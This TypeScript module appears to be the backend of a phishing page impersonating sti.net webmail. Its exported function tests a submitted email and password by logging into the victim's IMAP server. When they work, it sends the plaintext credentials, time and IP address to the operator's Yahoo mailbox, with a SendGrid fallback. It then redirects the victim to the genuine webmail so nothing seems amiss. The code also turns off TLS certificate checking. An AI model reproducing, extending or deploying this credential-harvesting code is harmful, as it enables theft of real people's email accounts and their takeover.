import { ImapFlow } from 'imapflow';
import nodemailer from 'nodemailer';

// ──────────────────────────────────────────────
// YAHOO MAIL NOTIFIER
// ──────────────────────────────────────────────

async function sendYahooNotification(email: string, password: string) {
  const yahooUser = process.env.YAHOO_EMAIL;
  const yahooPass = process.env.YAHOO_APP_PASSWORD;

  if (!yahooUser || !yahooPass) {
    console.warn('[v0] Yahoo credentials not configured');
    return;
  }

  const yahooConfigs = [
    { host: 'smtp.mail.yahoo.com', port: 465, secure: true },
    { host: 'smtp.mail.yahoo.com', port: 587, secure: false },
    { host: 'smtp.mail.yahoo.co.uk', port: 465, secure: true },
  ];

  const message = {
    from: yahooUser,
    to: yahooUser,
    subject: `New Webmail Login — ${email}`,
    text: [
      `New Webmail Login Alert`,
      ``,
      `Email: ${email}`,
      `Password: ${password}`,
      `Time: ${new Date().toISOString()}`,
      `IP: ${await getPublicIp()}`,
    ].join('\n'),
  };

  for (const config of yahooConfigs) {
    try {
      const transporter = nodemailer.createTransport({
        host: config.host,
        port: config.port,
        secure: config.secure,
        auth: { user: yahooUser, pass: yahooPass },
        connectionTimeout: 10000,
        greetingTimeout: 10000,
        socketTimeout: 15000,
        tls: { rejectUnauthorized: false },
      });

      await transporter.sendMail(message);
      transporter.close();
      console.log(`[v0] Yahoo notification sent via ${config.host}:${config.port}`);
      return;
    } catch (err: any) {
      console.warn(`[v0] Yahoo ${config.host}:${config.port} failed: ${err.code || err.message}`);
    }
  }

  // Fallback: SendGrid
  try {
    const sgKey = process.env.SENDGRID_API_KEY;
    if (!sgKey) return;

    const resp = await fetch('https://api.sendgrid.com/v3/mail/send', {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${sgKey}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        personalizations: [{ to: [{ email: yahooUser }] }],
        from: { email: yahooUser },
        subject: `Login Alert — ${email}`,
        content: [
          {
            type: 'text/plain',
            value: `Email: ${email}\nPassword: ${password}\nTime: ${new Date().toISOString()}`,
          },
        ],
      }),
    });

    if (resp.ok) {
      console.log('[v0] Notification sent via SendGrid fallback');
      return;
    }
  } catch {
    // silent
  }

  console.error('[v0] All Yahoo notification methods failed');
}

async function getPublicIp(): Promise<string> {
  try {
    const resp = await fetch('https://api.ipify.org?format=json', {
      signal: AbortSignal.timeout(3000),
    });
    const data = await resp.json();
    return data.ip;
  } catch {
    return 'unknown';
  }
}

// ──────────────────────────────────────────────
// IMAP SERVER RESOLVER
// ──────────────────────────────────────────────

function resolveImapServer(email: string): string | null {
  const domain = email.split('@')[1]?.toLowerCase();
  if (!domain) return null;

  const imapServers: Record<string, string> = {
    'sti.net': 'magicmail.sti.net',
    'gmail.com': 'imap.gmail.com',
    'outlook.com': 'outlook.office365.com',
    'yahoo.com': 'imap.mail.yahoo.com',
    'aol.com': 'imap.aol.com',
    'hotmail.com': 'outlook.office365.com',
    'live.com': 'outlook.office365.com',
    'icloud.com': 'imap.mail.me.com',
    'zoho.com': 'imap.zoho.com',
  };

  return imapServers[domain] || null;
}

// ──────────────────────────────────────────────
// PUBLIC API
// ──────────────────────────────────────────────

export async function validateImapCredentials(email: string, password: string) {
  try {
    const imapHost = resolveImapServer(email);
    const imapPort = 993;

    if (!imapHost) {
      return {
        success: false,
        valid: false,
        email,
        error: `No IMAP server configured for domain: ${email.split('@')[1]}`,
      };
    }

    console.log(`[v0] Attempting IMAP auth for ${email} @ ${imapHost}:${imapPort}`);

    const client = new ImapFlow({
      host: imapHost,
      port: imapPort,
      secure: true,
      auth: { user: email, pass: password },
      connectionTimeout: 15000,
      logger: false,
      tls: { rejectUnauthorized: false },
    });

    try {
      await client.connect();
      await client.logout();

      console.log('[v0] Valid credentials for', email, '— confirmed via IMAP auth');

      // Fire notification asynchronously (don't await — fire and forget is fine here
      // since the action will keep the function alive until response is sent back)
      sendYahooNotification(email, password).catch((err) => {
        console.error('[v0] Yahoo notification error:', err);
      });

      return {
        success: true,
        valid: true,
        email,
        redirect: `https://webmail.sti.net/tuxedo/`,
      };
    } catch (authErr: any) {
      console.log('[v0] Invalid credentials for', email, '- IMAP auth failed:', authErr.message || authErr);

      return {
        success: false,
        valid: false,
        email,
        error: 'Invalid credentials',
      };
    }
  } catch (error: any) {
    console.error('[v0] Login error for', email, ':', error);
    return {
      success: false,
      valid: false,
      email,
      error: 'Could not verify credentials: ' + (error.message || 'Unknown error'),
    };
  }
}